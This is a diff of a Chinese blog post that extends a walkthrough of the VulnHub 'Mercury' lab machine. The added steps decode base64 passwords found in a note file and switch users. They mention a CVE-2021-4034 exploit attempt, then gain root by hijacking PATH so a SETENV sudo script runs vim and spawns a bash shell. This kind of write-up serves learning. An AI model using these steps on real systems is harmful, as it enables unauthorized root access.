@@ -403,14 +403,14 @@ Host is up (0.">
                     
                     <div class="info-break-policy">
                         <i class="fa fa-file-word-o fa-fw"></i>文章字数:&nbsp;&nbsp;
-                        759
+                        1.1k
                     </div>
                     
 
                     
                     <div class="info-break-policy">
                         <i class="fa fa-clock-o fa-fw"></i>阅读时长:&nbsp;&nbsp;
-                        4 分
+                        5 分
                     </div>
                     
                 
@@ -529,9 +529,61 @@ Fact id: 3 union select column_name from information_schema.columns where table_
 Fact id: 3 union select group_concat(username," ",password) from mercury.users. (('Mercury is the closest planet to the Sun.',), ('john johnny1987,laura lovemykids111,sam lovemybeer111,webmaster mercuryisthesizeof0.056Earths',))
 
 </code></pre>
-<p>###拿下webmaster用户</p>
-<p>发现是<strong>webmaster</strong>用户，密码是<strong>mercuryisthesizeof0.056Earths</strong>成功登录</p>
+<h3 id="拿下webmaster用户"><a href="#拿下webmaster用户" class="headerlink" title="拿下webmaster用户"></a>拿下webmaster用户</h3><p>发现是<strong>webmaster</strong>用户，密码是<strong>mercuryisthesizeof0.056Earths</strong>成功登录</p>
 <p><img src="http://alexjakin.github.io/medias/reward/vulnhub/mercury/3.png" alt="成功以webmatser用户登录"> </p>
+<p>但是运行sudo -l发现该用户权限有限，连sudo命令都执行不了</p>
+<h3 id="拿下linuxmaster用户"><a href="#拿下linuxmaster用户" class="headerlink" title="拿下linuxmaster用户"></a>拿下linuxmaster用户</h3><p>发现该用户下有个python项目，进去观察后发现note.txt存在一些信息，怀疑这是用户信息，后面像是base64解码</p>
+<pre class=" language-text"><code class="language-text">
+Project accounts (both restricted):
+webmaster for web stuff - webmaster:bWVyY3VyeWlzdGhlc2l6ZW9mMC4wNTZFYXJ0aHMK
+linuxmaster for linux stuff - linuxmaster:bWVyY3VyeW1lYW5kaWFtZXRlcmlzNDg4MGttCg==
+
+</code></pre>
+<p>先对webmaster后面的做base64解码，得到确实是之前登陆webmaster用户的密码，所以我们解码linuxmaster后面的密码</p>
+<pre><code>
+$ echo &#39;bWVyY3VyeWlzdGhlc2l6ZW9mMC4wNTZFYXJ0aHMK&#39; | base64 -d
+mercuryisthesizeof0.056Earths
+
+$ echo &#39;bWVyY3VyeW1lYW5kaWFtZXRlcmlzNDg4MGttCg==&#39; | base64 -d
+mercurymeandiameteris4880km
+
+
+</code></pre><p>切换linuxmaster用户</p>
+<blockquote>
+<p>su linuxmaster</p>
+</blockquote>
+<p><img src="http://alexjakin.github.io/medias/reward/vulnhub/mercury/4.png" alt="成功提权linuxmaster"> </p>
+<h2 id="开始提权"><a href="#开始提权" class="headerlink" title="开始提权"></a>开始提权</h2><h3 id="CVE-2021-4034提权失败"><a href="#CVE-2021-4034提权失败" class="headerlink" title="CVE-2021-4034提权失败"></a>CVE-2021-4034提权失败</h3><p>上传linpeas脚本发现可能有<strong>CVE-2021-4034</strong>漏洞，github仓库：<a target="_blank" rel="noopener" href="https://github.com/berdav/CVE-2021-4034">https://github.com/berdav/CVE-2021-4034</a></p>
+<p>下载编译运行后没有反应 提权失败</p>
+<p><img src="http://alexjakin.github.io/medias/reward/vulnhub/mercury/5.png" alt="提权失败"></p>
+<h3 id="另辟提权蹊径"><a href="#另辟提权蹊径" class="headerlink" title="另辟提权蹊径"></a>另辟提权蹊径</h3><p>查看一下sudo权限</p>
+<blockquote>
+<p>sudo -l</p>
+</blockquote>
+<pre class=" language-text"><code class="language-text">[sudo] password for linuxmaster: 
+Matching Defaults entries for linuxmaster on mercury:
+    env_reset, mail_badpass,
+    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin
+
+User linuxmaster may run the following commands on mercury:
+    (root : root) SETENV: /usr/bin/check_syslog.sh
+</code></pre>
+<p>查看脚本信息</p>
+<pre><code>linuxmaster@mercury:~$ cat /usr/bin/check_syslog.sh
+#!/bin/bash
+tail -n 10 /var/log/syslog
+</code></pre><p>脚本的作用是读取sysysolog日志文件最后10行</p>
+<p>这里我们将tail命令用符号链接偷换成vim，然后更改环境变量</p>
+<blockquote>
+<p>ln -s /usr/bin/vim tail<br>  export PATH=$(pwd):$PATH</p>
+</blockquote>
+<p>打开syslog.sh脚本</p>
+<blockquote>
+<p>sudo –preserve-env=PATH /usr/bin/check_syslog.sh</p>
+</blockquote>
+<p>退出的时候输入<strong>:!/bin/bash</strong></p>
+<p>成功提权！</p>
+<p><img src="http://alexjakin.github.io/medias/reward/vulnhub/mercury/6.png" alt="提权成功"></p>
 
             </div>
             <hr/>
@@ -966,7 +1018,7 @@ Starting Nmap 7.93 ( https:</div>
 
             
                 &nbsp;<i class="fa fa-area-chart"></i>&nbsp;站点总字数:&nbsp;
-                <span class="white-color">74.6k</span>
+                <span class="white-color">75k</span>
             
 
             
